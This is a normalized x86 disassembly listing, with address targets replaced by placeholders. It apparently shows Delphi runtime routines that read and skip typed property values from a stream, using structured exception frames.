push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_417e18
mov ebx eax
test ebx ebx
je r-xdata
call sub_41bbf4
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414a68
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d0ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b688
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418454
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d0ec
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41d13b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e270
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_415288
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d142
lea eax [ ebp - 0x10 ]
call sub_40ee2c
retn
sub_41d148
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41d1fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c0f8
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41cb68
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b688
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418454
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41db58
lea eax [ ebp - 0x4 ]
call sub_4057bc
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_415424
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d201
lea eax [ ebp - 0x8 ]
call sub_403f50
lea eax [ ebp - 0x4 ]
call sub_4057bc
retn
sub_41d208
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d503
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d50a
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403f74
lea eax [ ebp - 0x24 ]
call sub_404630
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f74
retn
jmp [ eax * 4 + jump_table_41d298 ]
mov eax [ rw-data ]
call sub_41bbdc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4149f4
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c0f8
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c1b8
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414a68
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41cb68
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_41489c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414a68
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ca4c
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41503c
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41d9b8
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414d3c
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41da74
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e50
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d89c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414a68
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c0f8
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c0f8
cmp al 0xd
jne r-xdata
push ebp
call sub_41d0ec
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ccd4
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415368
jmp r-xdata
push ebp
call sub_41d148
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4149f4
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc68
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414a68
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41cb68
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d064
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db58
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414a68
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41cb68
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db58
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415308
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db58
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4149f4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c210
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415308
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41cb68
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d0ac
pop ecx
jmp r-xdata
sub_41d510
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403fa4
jmp r-xdata
mov eax [ ebx ]
call sub_417fb0
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408df4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d570
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d88b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d958
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41d869
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d82a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41d97c
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41d97c
mov eax [ ebp - 0x1c ]
call sub_417ad4
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41d97c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41d97c
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41d510
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41d97c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_40309c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417824
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41d7cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405eec
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_418454
xor eax eax
push ebp
push sub_41d7af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41860c
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d7b6
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403154
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4185b0
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41d800
call sub_40276c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403984
jmp r-xdata
call sub_403930
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41b904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d870
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41d82f
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41baac
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403930
call sub_403984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d870
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403154
sub_41d89c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d946
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d919
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41db58
cmp al 0xb
je r-xdata
mov eax ebx
call sub_41476c
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41bbf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41bc2c
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d94d
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d97c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41d97c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c11c
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404040
mov eax esi
call j_sub_40441c
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c11c
pop edx
pop esi
pop ebx
retn
sub_41d9b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41da65
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c0f8
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41da74
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4041d8
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41da6c
lea eax [ ebp - 0x8 ]
call sub_404630
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41db58
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41c11c
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40459c
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c11c
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c11c
jmp r-xdata
jmp r-xdata
call sub_41bbf4
sub_41da74
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41db4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c0f8
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41d9b8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40477c
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db52
lea eax [ ebp - 0xc ]
call sub_403f50
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41db58
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c11c
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404878
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41c11c
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c11c
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40459c
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c11c
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405b8c
jmp r-xdata
jmp r-xdata
call sub_41bbf4
sub_41db6c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41dba8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d97c
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dbaf
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_41dbb4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41bdb4
test al al
je r-xdata
mov eax [ ebx ]
call sub_41dc68
mov eax [ ebx ]
call sub_41cd20
pop ebx
pop ebp
retn
sub_41dbdc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c11c
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e060
pop ebx
pop ecx
pop ebp
retn
sub_41dc0c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41bdb4
test al al
je r-xdata
mov eax [ ebx ]
call sub_41c0f8
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41cd20
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41e060
jmp r-xdata
mov eax [ ebx ]
call sub_41dc68
mov eax [ ebx ]
call sub_41bdb4
test al al
je r-xdata
mov eax [ ebx ]
call sub_41de04
mov eax [ ebx ]
call sub_41cd20
sub_41dc68
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ddf7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41db58
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ddfe
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
jmp [ eax * 4 + jump_table_41dc9f ]
push ebp
call sub_41dbb4
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41e060
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41e060
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e060
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41e060
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d97c
jmp r-xdata
push ebp
mov eax 0x1
call sub_41dbdc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db6c
jmp r-xdata
push ebp
mov eax 0x1
call sub_41dbdc
pop ecx
jmp r-xdata
push ebp
call sub_41dc0c
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e060
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e060
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e060
jmp r-xdata
push ebp
mov eax 0x2
call sub_41dbdc
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e060
jmp r-xdata
push ebp
mov eax 0x1
call sub_41dbdc
pop ecx
sub_41de04
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41de41
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d97c
mov eax ebx
call sub_41dc68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de48
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_41de4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41dee4
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41bdb4
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41d97c
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41d97c
jmp r-xdata
mov eax ebx
call sub_41de04
mov eax ebx
call sub_41cd20
jmp r-xdata
mov eax ebx
call sub_41bdb4
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41de4c
mov eax ebx
call sub_41cd20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41deeb
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f74
retn
sub_41def4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41df99
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403fe8
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4214d4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dfa0
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
sub_41dfc4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41dfec
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41c04c
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_417a14
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403368
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41c04c
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41e060
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41c11c
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41c11c
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41e0a8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41e251
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41bc80
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e22c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c11c
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41ab48
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41c11c
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b53c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e207
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41d9b8
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41c11c
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41ab48
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41c11c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4143e4
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
lea eax [ ebp - 0x1c ]
call sub_4057bc
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d164
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
